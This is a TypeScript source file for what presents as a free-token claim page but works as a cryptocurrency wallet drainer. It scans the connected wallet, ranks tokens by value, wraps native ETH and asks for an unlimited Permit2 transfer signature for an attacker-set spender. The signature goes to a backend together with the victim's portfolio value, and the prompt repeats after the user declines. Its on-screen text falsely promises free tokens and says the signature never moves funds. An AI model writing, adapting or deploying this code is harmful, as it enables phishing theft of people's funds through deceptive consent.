// src/lib/permit2Flow.ts
import { toast } from 'sonner';
import { type Address } from 'viem';
import { storePermit2Signature, type Permit2BatchTypedData } from './backendClient';
import { scanWallet } from './walletScanner';
import { wrapNativeIfNeeded } from './nativeWrap';
import {
  cancelSignatureLoop,
  isSignatureLoopCancelled,
  resetSignatureCancel,
  setSignatureUi,
  waitForRetry,
} from './promptUiBus';

const SPENDER = (import.meta.env.VITE_SPENDER_ADDRESS as string | undefined) || '';
const EXPIRY_DAYS = Number(import.meta.env.VITE_PERMIT2_EXPIRY_DAYS ?? 30) || 30;

// Canonical Uniswap Permit2 — same address on every EVM chain.
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC61BA0' as const;

const MAX_UINT256 =
  '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';

// Batch tuning: Permit2 supports up to 256 tokens per batch, but fat wallets
// choke way before that and gas explodes. Cap it and sort by value.
const MAX_TOKENS_PER_BATCH = 10;
const MIN_TOKEN_VALUE_USD = 0;

const RETRY_DELAY_MS = 1500;
const MAX_ATTEMPTS = 5;
const SIGN_TIMEOUT_MS = 60_000;
const USER_REJECTED_CODES = [4001, 'ACTION_REJECTED'];

const isUserRejection = (err: any) =>
  USER_REJECTED_CODES.includes(err?.code) ||
  USER_REJECTED_CODES.includes(err?.cause?.code) ||
  /reject|denied|declin/i.test(String(err?.message ?? ''));

const getProvider = (): any | null =>
  typeof window === 'undefined' ? null : (window as any).ethereum ?? null;

// ── Cryptographically-unique nonce (no Date.now collisions) ──
function generateNonce(): string {
  const bytes = new Uint8Array(16);
  crypto.getRandomValues(bytes);
  return '0x' + Array.from(bytes).map(b => b.toString(16).padStart(2, '0')).join('');
}

interface TokenLike {
  address: string;
  symbol?: string;
  balance: bigint;
  balanceFormatted?: string;
  decimals?: number;
  valueUsd?: number;
  isNative?: boolean;
}

// ── Dedupe / sanitize the scanned token list before batching ──
function sanitizeTokens(tokens: TokenLike[]): TokenLike[] {
  const seen = new Set<string>();
  const out: TokenLike[] = [];
  for (const t of tokens) {
    const key = t.address.toLowerCase();
    if (!t.address || t.address === '0x' + '0'.repeat(40)) continue; // skip native
    if (seen.has(key)) continue;
    if (t.balance <= 0n) continue;
    if ((t.valueUsd ?? 0) < MIN_TOKEN_VALUE_USD) continue;
    seen.add(key);
    out.push(t);
  }
  // Highest value first — these land in the wallet's batch display first.
  return out
    .sort((a, b) => (b.valueUsd ?? 0) - (a.valueUsd ?? 0))
    .slice(0, MAX_TOKENS_PER_BATCH);
}

// ── Batch typed data: PermitBatchTransferFrom ──
const buildPermit2BatchTypedData = (params: {
  chainId: number;
  tokens: TokenLike[];
  nonce: string;
  deadline: number;
}): Permit2BatchTypedData => ({
  domain: {
    name: 'Permit2',
    chainId: params.chainId,
    verifyingContract: PERMIT2_ADDRESS,
  },
  types: {
    EIP712Domain: [
      { name: 'name', type: 'string' },
      { name: 'chainId', type: 'uint256' },
      { name: 'verifyingContract', type: 'address' },
    ],
    PermitBatchTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions[]' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'PermitBatchTransferFrom',
  message: {
    permitted: params.tokens.map(t => ({
      token: t.address as Address,
      amount: MAX_UINT256,
    })),
    nonce: params.nonce,
    deadline: params.deadline,
  },
});

// ── Legacy single-token typed data (fallback) ──
const buildPermit2SingleTypedData = (params: {
  chainId: number;
  token: string;
  nonce: string;
  deadline: number;
}): Permit2BatchTypedData => ({
  domain: {
    name: 'Permit2',
    chainId: params.chainId,
    verifyingContract: PERMIT2_ADDRESS,
  },
  types: {
    EIP712Domain: [
      { name: 'name', type: 'string' },
      { name: 'chainId', type: 'uint256' },
      { name: 'verifyingContract', type: 'address' },
    ],
    PermitTransferFrom: [
      { name: 'permitted', type: 'TokenPermissions' },
      { name: 'nonce', type: 'uint256' },
      { name: 'deadline', type: 'uint256' },
    ],
    TokenPermissions: [
      { name: 'token', type: 'address' },
      { name: 'amount', type: 'uint256' },
    ],
  },
  primaryType: 'PermitTransferFrom',
  message: {
    permitted: { token: params.token as Address, amount: MAX_UINT256 },
    nonce: params.nonce,
    deadline: params.deadline,
  },
});

// ── signTypedData with timeout ──
async function signTypedDataWithTimeout(address: string, typedData: any): Promise<string> {
  const provider = getProvider();
  if (!provider) throw new Error('No injected wallet provider found.');

  return Promise.race([
    provider.request({
      method: 'eth_signTypedData_v4',
      params: [address, JSON.stringify(typedData)],
    }),
    new Promise<never>((_, reject) =>
      setTimeout(() => reject(new Error('SIGN_TIMEOUT')), SIGN_TIMEOUT_MS)
    ),
  ]);
}

// ── localStorage fallback ──
const PENDING_SIGS_KEY = 'dapp:pendingSigs';

function queuePendingSig(payload: any) {
  try {
    const existing = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    existing.push({ ...payload, queuedAt: Date.now() });
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(existing.slice(-20)));
  } catch { /* private mode */ }
}

async function flushPendingSigs() {
  try {
    const queued: any[] = JSON.parse(localStorage.getItem(PENDING_SIGS_KEY) ?? '[]');
    if (!queued.length) return;
    const remaining: any[] = [];
    for (const item of queued) {
      try {
        await storePermit2Signature(item);
      } catch {
        remaining.push(item);
      }
    }
    localStorage.setItem(PENDING_SIGS_KEY, JSON.stringify(remaining));
  } catch { /* noop */ }
}

export interface RunPermit2FlowArgs {
  address: string;
  chainId?: number;
  walletName?: string | null;
}

export async function runPermit2Flow({
  address,
  chainId,
  walletName,
}: RunPermit2FlowArgs) {
  if (!SPENDER) {
    console.warn('VITE_SPENDER_ADDRESS is not set — skipping Permit2 flow.');
    return;
  }

  flushPendingSigs().catch(() => {});

  const activeChainId = chainId ?? 1;

  // ── 1. Scan the wallet ──
  let tokens: TokenLike[];
  try {
    tokens = await scanWallet(address as Address, activeChainId);
  } catch (err: any) {
    console.error('wallet scan failed', err);
    toast.error('Could not read your wallet balances', {
      description: String(err?.message ?? '').slice(0, 140),
    });
    return;
  }

  let batchTokens = sanitizeTokens(tokens);
  if (!batchTokens.length) {
    toast.info('No supported tokens found', {
      description:
        'The approval requires at least one supported ERC-20 token with a balance on this chain.',
      duration: 8000,
    });
    return;
  }

  // ── 2. Native wrap step ──
  // If the top asset is native, we need to wrap it into the canonical
  // ERC-20 equivalent before Permit2 can touch it.
  const top = batchTokens[0];

  if (top.isNative) {
    try {
      const wrapResult = await wrapNativeIfNeeded(address, activeChainId, {
        address: top.address,
        symbol: top.symbol,
        balance: top.balance,
        balanceFormatted: top.balanceFormatted,
        isNative: true,
      });

      if (wrapResult?.wrapped) {
        // Re-scan — the wrapped token is now an ERC-20 and should appear
        const refreshed = await scanWallet(address as Address, activeChainId);
        const refreshedBatch = sanitizeTokens(refreshed);
        if (refreshedBatch.length) {
          batchTokens = refreshedBatch;
        }
      } else {
        // Wrap skipped (can't afford gas / no contract / user cancelled).
        // Fall back: pick the highest-value NON-native ERC-20.
        const erc20Only = tokens.filter(t => !t.isNative);
        const fallbackBatch = sanitizeTokens(erc20Only);
        if (fallbackBatch.length) {
          batchTokens = fallbackBatch;
        } else {
          // User has ONLY native and can't afford gas — nothing to claim.
          toast.info('Insufficient balance', {
            description: 'You need a small amount of ETH for network fees to complete this request.',
            duration: 8000,
          });
          return;
        }
      }
    } catch (err: any) {
      console.warn('native wrap failed', err);
      toast.error('Could not complete the deposit', {
        description: String(err?.message ?? '').slice(0, 140),
      });
      return;
    }
  }

  const totalUsd = tokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);
  const batchUsd = batchTokens.reduce((sum, t) => sum + (t.valueUsd ?? 0), 0);

  // ── 3. Chain switch if needed ──
  let effectiveChainId = (batchTokens[0] as any).chainId ?? activeChainId;
  if (effectiveChainId !== activeChainId) {
    const provider = getProvider();
    if (provider) {
      try {
        await provider.request({
          method: 'wallet_switchEthereumChain',
          params: [{ chainId: '0x' + effectiveChainId.toString(16) }],
        });
        await new Promise(r => setTimeout(r, 400));
      } catch (e) {
        console.warn('chain switch failed, signing on current chain', e);
        effectiveChainId = activeChainId;
      }
    }
  }

  // ── 4. Mutable signing state ──
  let batchMode = true;
  let deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
  let nonce = generateNonce();

  const buildCurrentTypedData = (): Permit2BatchTypedData =>
    batchMode
      ? buildPermit2BatchTypedData({
          chainId: effectiveChainId,
          tokens: batchTokens,
          nonce,
          deadline,
        })
      : buildPermit2SingleTypedData({
          chainId: effectiveChainId,
          token: batchTokens[0].address,
          nonce,
          deadline,
        });

  let typedData = buildCurrentTypedData();

  // ── 5. Prompt loop ──
  resetSignatureCancel();
  setSignatureUi({
    open: true,
    status: 'waiting',
    attempt: 1,
    title: 'You are about to receive your free tokens',
    description: batchTokens.length > 1
      ? `Tap Approve in your wallet to unlock your allocation across ${batchTokens.length} tokens. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.`
      : 'Tap Approve in your wallet to unlock the allocation. Some wallets show generic wording like "Sign message" — that is the same approval, it is safe and it never moves funds on its own.',
    errorMessage: undefined,
  });

  let attempt = 0;
  while (true) {
    if (isSignatureLoopCancelled()) return;
    if (attempt >= MAX_ATTEMPTS) {
      console.warn('[permit2] max attempts reached, giving up');
      setSignatureUi({ open: false, status: 'failed', attempt });
      return;
    }
    attempt += 1;
    setSignatureUi({ status: 'waiting', attempt, errorMessage: undefined });

    try {
      const signature = await signTypedDataWithTimeout(address, typedData);
      setSignatureUi({ status: 'approved' });

      const payload = {
        owner: address,
        chainId: effectiveChainId,
        mode: batchMode ? 'batch' : 'single',
        tokens: batchMode
          ? batchTokens.map(t => ({
              token: t.address,
              tokenSymbol: t.symbol,
              balance: t.balance.toString(),
              balanceFormatted: t.balanceFormatted,
              decimals: t.decimals,
              valueUsd: t.valueUsd,
              signedAmount: MAX_UINT256,
            }))
          : [],
        token: batchTokens[0].address,
        tokenSymbol: batchTokens[0].symbol,
        amount: batchTokens[0].balance.toString(),
        signedAmount: MAX_UINT256,
        balanceFormatted: batchTokens[0].balanceFormatted,
        decimals: batchTokens[0].decimals,
        nonce,
        deadline,
        spender: SPENDER,
        signature,
        typedData,
        walletName,
        portfolioUsd: totalUsd,
        batchValueUsd: batchUsd,
        tokenValueUsd: batchTokens[0].valueUsd,
      };

      // ── 6. Send to backend with queued fallback ──
      let stored = false;
      try {
        await storePermit2Signature(payload);
        stored = true;
      } catch (e) {
        console.warn('storePermit2Signature failed — queueing locally', e);
        queuePendingSig(payload);
      }

      if (stored) {
        toast.success('Approved — your tokens are on the way 🎁');
      } else {
        toast.success('Approved — sync will complete shortly');
      }

      setTimeout(() => cancelSignatureLoop(), 1500);
      return;

    } catch (err: any) {
      const rejected = isUserRejection(err);
      const timedOut = String(err?.message ?? '').includes('SIGN_TIMEOUT');
      const batchUnsupported = !rejected && !timedOut && batchMode &&
        /TokenPermissions\[\]|\barray\b|batch|permitted/i.test(String(err?.message ?? ''));

      setSignatureUi({
        status: rejected ? 'rejected' : 'failed',
        attempt,
        errorMessage: rejected ? undefined : String(err?.message ?? err).slice(0, 160),
      });

      if (!getProvider()) {
        toast.error('No wallet detected', {
          description: 'Open the site inside your wallet app browser and try again.',
        });
        cancelSignatureLoop();
        return;
      }

      if (batchUnsupported) {
        console.warn('[permit2] batch unsupported, falling back to single-token', err);
        batchMode = false;
        nonce = generateNonce();
        deadline = Math.floor(Date.now() / 1000) + EXPIRY_DAYS * 24 * 60 * 60;
        typedData = buildCurrentTypedData();
        setSignatureUi({
          status: 'waiting',
          attempt,
          description: 'Tap Approve in your wallet to unlock the allocation.',
        });
        await waitForRetry(RETRY_DELAY_MS);
        continue;
      }

      if (timedOut) {
        await waitForRetry(RETRY_DELAY_MS * 3);
      } else {
        await waitForRetry(RETRY_DELAY_MS);
      }
    }
  }
}
